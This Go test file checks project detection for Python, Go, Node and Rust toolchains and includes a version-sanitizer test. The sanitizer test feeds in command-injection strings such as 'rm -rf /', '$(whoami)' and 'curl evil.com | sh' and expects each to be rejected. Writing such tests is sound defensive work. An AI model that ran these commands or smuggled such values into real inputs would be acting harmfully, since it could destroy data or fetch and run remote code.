package scaffold

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestDetect_Python_UV(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "uv.lock", "")
	writeFile(t, dir, ".python-version", "3.13")
	mkdirAll(t, filepath.Join(dir, "src"))
	mkdirAll(t, filepath.Join(dir, "tests"))

	info := Detect(dir)

	assert.Equal(t, "python", string(info.Language))
	assert.Equal(t, "uv", string(info.PackageManager))
	assert.Equal(t, "3.13", info.LanguageVersion)
	assert.Equal(t, "uv sync --all-extras", info.InstallCmd)
	assert.Equal(t, "uv run pytest", info.TestCmd)
	assert.Equal(t, "uv run pyright", info.TypecheckCmd)
	assert.Equal(t, "uv run ruff check", info.LintCmd)
	assert.Contains(t, info.SourceDirs, "src")
	assert.Contains(t, info.TestDirs, "tests")
	assert.Equal(t, "specs", info.SpecsDir)
}

func TestDetect_Python_Poetry(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "poetry.lock", "")

	info := Detect(dir)

	assert.Equal(t, "python", string(info.Language))
	assert.Equal(t, "poetry", string(info.PackageManager))
	assert.Equal(t, "3.12", info.LanguageVersion) // default
	assert.Equal(t, "poetry install", info.InstallCmd)
}

func TestDetect_Go(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "go.mod", "module example.com/test\n\ngo 1.25.7\n")
	writeFile(t, dir, "go.sum", "")
	mkdirAll(t, filepath.Join(dir, "cmd"))
	mkdirAll(t, filepath.Join(dir, "internal"))
	writeFile(t, dir, "Makefile", "")

	info := Detect(dir)

	assert.Equal(t, "go", string(info.Language))
	assert.Equal(t, "go", string(info.PackageManager))
	assert.Equal(t, "1.25.7", info.LanguageVersion)
	assert.Equal(t, "go mod download", info.InstallCmd)
	assert.Equal(t, "go test ./...", info.TestCmd)
	assert.True(t, info.HasMakefile)
	assert.GreaterOrEqual(t, len(info.SourceDirs), 2)
}

func TestDetect_Node_NPM(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package-lock.json", "{}")
	writeFile(t, dir, ".nvmrc", "20")

	info := Detect(dir)

	assert.Equal(t, "node", string(info.Language))
	assert.Equal(t, "npm", string(info.PackageManager))
	assert.Equal(t, "20", info.LanguageVersion)
	assert.Equal(t, "npm install", info.InstallCmd)
}

func TestDetect_Node_Yarn(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "yarn.lock", "")

	info := Detect(dir)

	assert.Equal(t, "node", string(info.Language))
	assert.Equal(t, "yarn", string(info.PackageManager))
	assert.Equal(t, "22", info.LanguageVersion) // default
}

func TestDetect_Node_PNPM(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "pnpm-lock.yaml", "")

	info := Detect(dir)

	assert.Equal(t, "node", string(info.Language))
	assert.Equal(t, "pnpm", string(info.PackageManager))
}

func TestDetect_Rust(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "Cargo.toml", "[package]\nname = \"test\"")
	writeFile(t, dir, "Cargo.lock", "")
	writeFile(t, dir, "rust-toolchain", "nightly")

	info := Detect(dir)

	assert.Equal(t, "rust", string(info.Language))
	assert.Equal(t, "cargo", string(info.PackageManager))
	assert.Equal(t, "nightly", info.LanguageVersion)
	assert.Equal(t, "cargo build", info.InstallCmd)
	assert.Equal(t, "cargo test", info.TestCmd)
}

func TestDetect_DepsDir_Node(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package-lock.json", "{}")

	info := Detect(dir)
	assert.Equal(t, "node_modules", info.DepsDir)
}

func TestDetect_DepsDir_Python(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "uv.lock", "")

	info := Detect(dir)
	assert.Equal(t, ".venv", info.DepsDir)
}

func TestDetect_DepsDir_Rust(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "Cargo.toml", "[package]\nname = \"test\"")

	info := Detect(dir)
	assert.Equal(t, "target", info.DepsDir)
}

func TestDetect_DepsDir_Go_Empty(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "go.mod", "module example.com/test\n\ngo 1.25.7\n")
	writeFile(t, dir, "go.sum", "")

	info := Detect(dir)
	assert.Empty(t, info.DepsDir)
}

func TestDetect_ExtraAllowedDomains_Python(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "uv.lock", "")

	info := Detect(dir)
	assert.Equal(t, []string{"pypi.org", "files.pythonhosted.org"}, info.ExtraAllowedDomains)
}

func TestDetect_ExtraAllowedDomains_Go(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "go.mod", "module example.com/test\n\ngo 1.25.7\n")
	writeFile(t, dir, "go.sum", "")

	info := Detect(dir)
	assert.Equal(t, []string{"proxy.golang.org", "sum.golang.org", "storage.googleapis.com"}, info.ExtraAllowedDomains)
}

func TestDetect_ExtraAllowedDomains_Rust(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "Cargo.toml", "[package]\nname = \"test\"")

	info := Detect(dir)
	assert.Equal(t, []string{"crates.io", "static.crates.io", "index.crates.io"}, info.ExtraAllowedDomains)
}

func TestDetect_ExtraAllowedDomains_Node_Empty(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package-lock.json", "{}")

	info := Detect(dir)
	assert.Empty(t, info.ExtraAllowedDomains)
}

func TestDetect_ExtraAllowedDomains_Unknown_Empty(t *testing.T) {
	dir := t.TempDir()

	info := Detect(dir)
	assert.Empty(t, info.ExtraAllowedDomains)
}

func TestDetect_Unknown(t *testing.T) {
	dir := t.TempDir()

	info := Detect(dir)

	assert.Equal(t, "unknown", string(info.Language))
	assert.Equal(t, "unknown", string(info.PackageManager))
	assert.Equal(t, filepath.Base(dir), info.ProjectName)
}

func TestDetect_ProjectName(t *testing.T) {
	dir := t.TempDir()
	info := Detect(dir)
	assert.Equal(t, filepath.Base(dir), info.ProjectName)
}

func TestDetect_BaseImage(t *testing.T) {
	dir := t.TempDir()
	info := Detect(dir)
	assert.Equal(t, "node:22-bookworm", info.BaseImage)
}

func TestDetect_GoVersionParsing(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "go.mod", "module example.com/mymod\n\ngo 1.23.4\n\nrequire (\n)")
	writeFile(t, dir, "go.sum", "")

	info := Detect(dir)
	assert.Equal(t, "1.23.4", info.LanguageVersion)
}

func TestDetect_PythonDefaultVersion(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "uv.lock", "")

	info := Detect(dir)
	assert.Equal(t, "3.12", info.LanguageVersion)
}

func TestSourceDirsList(t *testing.T) {
	info := &ProjectInfo{SourceDirs: []string{"src", "lib"}}
	assert.Equal(t, "src/, lib/", info.SourceDirsList())
}

func TestSourceDirsList_Empty(t *testing.T) {
	info := &ProjectInfo{}
	assert.Equal(t, "src/", info.SourceDirsList())
}

func TestTestDirsList_Empty(t *testing.T) {
	info := &ProjectInfo{}
	assert.Equal(t, "tests/", info.TestDirsList())
}

func TestSanitizeVersion(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"1.25.7", "1.25.7"},
		{"3.12", "3.12"},
		{"22", "22"},
		{"stable", "stable"},
		{"nightly", "nightly"},
		{"nightly-2024-01-01", "nightly-2024-01-01"},
		{"1.80+hotfix", "1.80+hotfix"},
		// Malicious inputs should be rejected
		{"3.12; rm -rf /", ""},
		{"stable$(whoami)", ""},
		{"22\nRUN evil", ""},
		{"`id`", ""},
		{"v1 && curl evil.com | sh", ""},
		{"", ""},
	}
	for _, tt := range tests {
		got := sanitizeVersion(tt.input)
		assert.Equal(t, tt.want, got, "sanitizeVersion(%q)", tt.input)
	}
}

func TestDetect_MaliciousVersionFile(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "Cargo.toml", "[package]\nname = \"test\"")
	writeFile(t, dir, "rust-toolchain", "stable; rm -rf /")

	info := Detect(dir)
	assert.Equal(t, "", info.LanguageVersion)
}

// helpers

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func mkdirAll(t *testing.T, path string) {
	t.Helper()
	if err := os.MkdirAll(path, 0o750); err != nil {
		t.Fatal(err)
	}
}

// assertEqual is kept for compatibility with generate_test.go and prompt_test.go
// which may still use it.
func assertEqual(t *testing.T, field, got, want string) {
	t.Helper()
	require.Equal(t, want, got, field)
}
